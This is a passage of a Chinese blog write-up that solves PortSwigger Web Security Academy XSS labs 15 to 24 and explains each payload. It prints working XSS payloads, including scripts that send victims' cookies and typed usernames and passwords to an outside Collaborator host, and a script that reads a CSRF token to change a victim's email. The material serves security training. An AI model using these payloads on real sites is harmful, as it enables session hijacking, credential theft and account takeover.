+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224120897.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224120897.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224120897.png 2x"
+    data-sizes="auto"
+    alt="image-20250306224120897"
+    title="image-20250306224120897"/></p>
+<h3 id="15除了自定义标签外所有html标签都被过滤的反射型xss">15.除了自定义标签外所有HTML标签都被过滤的反射型XSS</h3>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked"target="_blank" rel="external nofollow noopener noreferrer">Reflected XSS into HTML context with all tags blocked except custom ones<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<blockquote>
+<p>为自定义标签设置id属性，并像操作其他DOM元素一样，通过JavaScript来访问和操作这些带有id的自定义元素，在url中使用#id可以将页面定位到指定id元素。</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">location</span> <span class="o">=</span> <span class="s1">&#39;https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这段js代码将浏览器的当前位置重定向到指定的URL，serach参数的内容是 <code>&lt;xss id=x onfocus=alert(document.cookie) tabindex=1&gt;</code>。</p>
+<p>这个 XSS payload中：<code>&lt;xss id=x</code>：是一个自定义的标签，用于识别和定位该元素。<code>onfocus=alert(document.cookie)</code>：在元素获得焦点时触发弹出一个对话框显示当前cookie信息。<code>tabindex=1</code>：设置tabindex属性为1，用户在通过Tab键切换焦点时可能会先将焦点定位到这个自定义元素上。</p>
+<p>进入exploit server，将以下playload保存并发送给受害者。</p>
+<h3 id="16svg标签的反射型xss">16.SVG标签的反射型XSS</h3>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed"target="_blank" rel="external nofollow noopener noreferrer">Reflected XSS with some SVG markup allowed<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>burp intruder爆破标签和属性发现svg标签、animatetransform标签未被过滤。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224752583.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224752583.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224752583.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224752583.png 2x"
+    data-sizes="auto"
+    alt="image-20250306224752583"
+    title="image-20250306224752583"/></p>
+<p>payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">animatetransform</span> <span class="na">onbegin</span><span class="o">=</span><span class="s">alert(/xss/)</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中<code>&lt;svg&gt;</code>标签表示开始一个 SVG 图形容器；<code>&lt;animateTransform&gt;</code>元素用于定义 SVG 动画中的变换效果；<code>onbegin</code>属性定义了动画开始时要执行的脚本或函数。</p>
+<h3 id="17规范链接标签中的反射型xss">17.规范链接标签中的反射型XSS</h3>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag"target="_blank" rel="external nofollow noopener noreferrer">Reflected XSS in canonical link tag<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<h3 id="18javascript字符串中转义了单引号和反斜杠的反射型xss">18.JavaScript字符串中转义了单引号和反斜杠的反射型XSS</h3>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped"target="_blank" rel="external nofollow noopener noreferrer">Reflected XSS into a JavaScript string with single quote and backslash escaped<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>过滤了单引号和反斜杠，无法闭合searchItem：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306225658226.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306225658226.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306225658226.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306225658226.png 2x"
+    data-sizes="auto"
+    alt="image-20250306225658226"
+    title="image-20250306225658226"/></p>
+<p>输入<code>&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，第一个<code>&lt;/script&gt;</code>用作闭合最前面的script标签了。后面被script被正常执行。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306225818785.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306225818785.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306225818785.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306225818785.png 2x"
+    data-sizes="auto"
+    alt="image-20250306225818785"
+    title="image-20250306225818785"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306225837886.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306225837886.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306225837886.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306225837886.png 2x"
+    data-sizes="auto"
+    alt="image-20250306225837886"
+    title="image-20250306225837886"/></p>
+<h3 id="19javascript字符串中转义了单引号并对尖括号和双引号进行html编码的反射xss">19.JavaScript字符串中转义了单引号并对尖括号和双引号进行html编码的反射XSS</h3>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped"target="_blank" rel="external nofollow noopener noreferrer">Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>可以看到对单引号进行了转义、尖括号和双引号进行了编码：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094127031.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094127031.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094127031.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094127031.png 2x"
+    data-sizes="auto"
+    alt="image-20250307094127031"
+    title="image-20250307094127031"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094041932.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094041932.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094041932.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094041932.png 2x"
+    data-sizes="auto"
+    alt="image-20250307094041932"
+    title="image-20250307094041932"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307093958428.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307093958428.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307093958428.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307093958428.png 2x"
+    data-sizes="auto"
+    alt="image-20250307093958428"
+    title="image-20250307093958428"/></p>
+<p>输入<code>\';alert(/xss/);//</code>，<strong>使用反斜杠来转义‘转义单引号的反斜杠’，这样单引号不会被转义，使得js字符串的单引号闭合</strong></p>
+<p><code>;</code>使语句完整，在alert后注释掉后面的js代码，构成完整语句不报错。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\&#39;-alert(1)//
+</span></span><span class="line"><span class="cl">\&#39;;alert(/xss/);//
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094429095.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094429095.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094429095.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094429095.png 2x"
+    data-sizes="auto"
+    alt="image-20250307094429095"
+    title="image-20250307094429095"/></p>
+<h3 id="20对尖括号和双引号html编码及对单引号和反斜杠进行转义的存储型xss">20.对尖括号和双引号HTML编码及对单引号和反斜杠进行转义的存储型XSS</h3>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped"target="_blank" rel="external nofollow noopener noreferrer">Stored XSS into <code>onclick</code> event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>在评论功能处</p>
+<p>可以看到单引号和反斜杠被转义：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094825118.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094825118.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094825118.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094825118.png 2x"
+    data-sizes="auto"
+    alt="image-20250307094825118"
+    title="image-20250307094825118"/></p>
+<p>想要实现payload的逃逸，就要绕出onclick事件的包裹</p>
+<p>使用html实体编码闭合前后的单引号，绕过单引号转义，<code>&amp;apos;</code>为单引号的html实体编码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="ni">&amp;apos;</span>-alert(1)-<span class="ni">&amp;apos;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>点击用户名触发：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095134444.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095134444.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095134444.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095134444.png 2x"
+    data-sizes="auto"
+    alt="image-20250307095134444"
+    title="image-20250307095134444"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095247794.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095247794.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095247794.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095247794.png 2x"
+    data-sizes="auto"
+    alt="image-20250307095247794"
+    title="image-20250307095247794"/></p>
+<h3 id="21对尖括号单双引号反斜杠和反引号进行模板文本unicode转义的反射xss">21.对尖括号，单双引号，反斜杠和反引号进行模板文本unicode转义的反射XSS</h3>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped"target="_blank" rel="external nofollow noopener noreferrer">Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>本实验包含搜索博客功能中反映的跨站点脚本漏洞。<strong>反射发生在一个模板字符串</strong>中，该字符串带有尖括号、HTML编码的单引号和双引号以及转义的反引号。要解决此实验，请执行跨站点脚本攻击，在模板字符串中调用alert函数。</p>
+<p>在搜索框中测试，发现进行了unicode编码转义：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095533025.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095533025.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095533025.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095533025.png 2x"
+    data-sizes="auto"
+    alt="image-20250307095533025"
+    title="image-20250307095533025"/></p>
+<p>根据题目提示使用模板字符串</p>
+<blockquote>
+<p>JavaScript模板字符串使用<code>反引号</code>包裹，使用<code>${}</code>语法可以插入变量或表达式，这些变量或表达式会被执行并插入到字符串中</p>
+</blockquote>
+<p>可以从上图中看到确实在被反引号包裹的，所以这里使用<code>${}</code>进行插入</p>
+<p>输入<code>${1+1}</code>可以看到被执行</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095853826.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095853826.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095853826.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095853826.png 2x"
+    data-sizes="auto"
+    alt="image-20250307095853826"
+    title="image-20250307095853826"/></p>
+<p>payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">${alert(1)}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095912520.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095912520.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095912520.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095912520.png 2x"
+    data-sizes="auto"
+    alt="image-20250307095912520"
+    title="image-20250307095912520"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095923604.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095923604.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095923604.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095923604.png 2x"
+    data-sizes="auto"
+    alt="image-20250307095923604"
+    title="image-20250307095923604"/></p>
+<h3 id="22利用xss来窃取cookies">22.利用XSS来窃取Cookies</h3>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies"target="_blank" rel="external nofollow noopener noreferrer">Exploiting cross-site scripting to steal cookies<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>评论功能中的存储型XSS漏洞。利用该漏洞窃取受害者的会话cookie，然后使用该cookie来冒充受害者。</p>
+<p>1.打开Burp Collaborator Client，复制地址</p>
+<p>2.在留言板提交下面内容，fetch里面的URL内容是Burp Collaborator Client复制出来的payload。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://nulfyp1987evstcfop4hde17dyjp7fv4.oastify.com&#39;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;no-cors&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="nx">body</span><span class="o">:</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这段js脚本使用fetch函数向Collaborator的url发送了一个POST请求，它将当前页面的cookie作为请求的body发送到了Collaborator。</p>
+<p>3.回到Collaborator，看到下方HTTP交互的Request to Collaborator，发现了脚本发送来的请求，其中body值为我们要的cookie。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307102433171.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307102433171.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307102433171.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307102433171.png 2x"
+    data-sizes="auto"
+    alt="image-20250307102433171"
+    title="image-20250307102433171"/></p>
+<p>4.burp拦截包，刷新Home页面，Burp拦截后把其中的session替换为从Collaborator拿到的session。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307102700435.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307102700435.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307102700435.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307102700435.png 2x"
+    data-sizes="auto"
+    alt="image-20250307102700435"
+    title="image-20250307102700435"/></p>
+<h3 id="23利用xss来窃取密码">23.利用XSS来窃取密码</h3>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords"target="_blank" rel="external nofollow noopener noreferrer">Exploiting cross-site scripting to capture passwords<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>和上一题类似</p>
+<p>将下面的脚本放到留言板</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">username</span> <span class="na">id</span><span class="o">=</span><span class="s">username</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">password</span> <span class="na">name</span><span class="o">=</span><span class="s">password</span> <span class="na">onchange</span><span class="o">=</span><span class="s">&#34;if(this.value.length)fetch(&#39;https://2qtuu4xo4maao88uk40w9txm9df53vrk.oastify.com&#39;,{
+</span></span></span><span class="line"><span class="cl"><span class="s">method:&#39;POST&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s">mode: &#39;no-cors&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s">body:username.value+&#39;:&#39;+this.value
+</span></span></span><span class="line"><span class="cl"><span class="s">});&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这段js脚本包含了两个输入框，一个是用户名的输入框，另一个是密码的输入框。当密码输入框的值发生改变时（onchange事件）会执行js代码。</p>
+<p>其中使用了fetch函数发送了一个POST请求到Collaborator。请求的body部分使用了用户名和密码的组合进行拼接，并且使用冒号进行分隔。其中，用户名是通过username.value获取的，而密码是通过this.value获取的（即当前密码输入框的值）。</p>
+<p>提交留言后，回到Collaborator，可以看到下方HTTP交互，脚本发送来的请求的内容是我们要的用户名和密码，然后冒充该用户登录。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307103102579.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307103102579.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307103102579.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307103102579.png 2x"
+    data-sizes="auto"
+    alt="image-20250307103102579"
+    title="image-20250307103102579"/></p>
+<h3 id="24利用xss执行csrf">24.利用XSS执行CSRF</h3>
+<p>Exploiting XSS to bypass CSRF defenses</p>
+<p>目的：执行CSRF攻击，并更改查看博客文章评论的人的电子邮件地址。</p>
+<p>进入我的账户页面，查看源码会发现在登录表单中存在一个隐藏的 CSRF token，他会在登录表单提交时被携带。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307103520675.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307103520675.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307103520675.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307103520675.png 2x"
+    data-sizes="auto"
+    alt="image-20250307103520675"
+    title="image-20250307103520675"/></p>
+<p>在留言板提交这段js脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">req</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">handleResponse</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">,</span><span class="s1">&#39;/my-account&#39;</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">handleResponse</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/name=&#34;csrf&#34; value=&#34;(\w+)&#34;/</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">changeReq</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">changeReq</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;post&#39;</span><span class="p">,</span> <span class="s1">&#39;/my-account/change-email&#39;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">changeReq</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;csrf=&#39;</span><span class="o">+</span><span class="nx">token</span><span class="o">+</span><span class="s1">&#39;&amp;email=test@test.com&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这段js首先通过XMLHttpRequest对象发送了一个GET请求到/my-account页面，一旦请求完成，会调用handleResponse函数。</p>
+<p>在handleResponse函数中，从响应文本中使用了正则表达式提取了一个名为&quot;csrf&quot;、值为一个单词字符序列的CSRF token。</p>
+<p>接着发送一个POST请求到/my-account/change-email页面。在这个请求中，包含了之前获取到的CSRF token以及要修改的邮箱地址test@test.com。</p>
+<p>提交后回到留言界面，该脚本就被执行了，邮箱地址被更改为test@test.com。</p>
+<p>参考：</p>
+<p><a href="https://www.cnblogs.com/smileleooo/p/18069037#615-%E9%99%A4%E4%BA%86%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%87%E7%AD%BE%E5%A4%96%E6%89%80%E6%9C%89html%E6%A0%87%E7%AD%BE%E9%83%BD%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/smileleooo/p/18069037#615-%E9%99%A4%E4%BA%86%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%87%E7%AD%BE%E5%A4%96%E6%89%80%E6%9C%89html%E6%A0%87%E7%AD%BE%E9%83%BD%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8Bxss<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>  很多解题文字由于懒了，直接照搬的，感谢这位师傅</p>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"target="_blank" rel="external nofollow noopener noreferrer">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p><a href="https://blog.csdn.net/qq_33168924/article/details/135657809"target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/qq_33168924/article/details/135657809<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2025-03-08&#32;07:13:00>更新于 2025-03-08&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
